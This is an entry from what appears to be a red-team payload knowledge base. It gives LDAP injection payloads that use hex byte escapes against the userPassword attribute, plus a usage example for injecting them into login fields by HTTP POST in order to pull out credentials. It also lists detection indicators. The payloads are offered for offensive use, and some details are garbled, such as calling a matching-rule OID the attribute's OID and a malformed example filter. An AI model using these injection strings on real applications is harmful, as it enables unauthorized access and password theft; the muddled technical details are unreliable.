---
type: code
language: ldif
verified: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - LDAP
tags:
  - ldap-injection
  - payload
validated: true
---

# LDAP-UserPassword-Encoding-Payload

## Code

```ldif
userPassword:2.5.13.18:=\xx (\xx is a byte)
userPassword:2.5.13.18:=\xx\xx
userPassword:2.5.13.18:=\xx\xx\xx
```

## Description

This LDIF-formatted payload uses LDAP escape sequences to target the binary userPassword attribute (OID 2.5.13.18). It allows injection of hexadecimal byte values (\xx) to manipulate queries, extract encoded passwords, or bypass filters in vulnerable applications. Preserve for use in injection strings to handle non-string password storage like SSHA or binary hashes.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| \xx | Single hexadecimal byte for binary manipulation | \00 |
| \xx\xx | Two-byte sequence | \ab\cd |
| \xx\xx\xx | Three-byte sequence | \ef\01\02 |

## Usage

Inject into user input fields of LDAP-backed apps, e.g., username=*)(userPassword=2.5.13.18:=\00\00 ) | *. Deliver via HTTP POST (e.g., with curl) to alter search or auth queries. Useful in red team ops for credential extraction after basic injection confirmation.

## Detection

- LDAP server logs showing malformed filters with escape sequences (\xx patterns).
- Anomalous query results returning binary attributes unexpectedly.
- Application logs with injection attempts on userPassword.

## Related

- [[procedures/LDAP-Injection-Exploiting-userPassword-Attribute]]
- [[commands/inject-ldap-userpassword-encoding]]
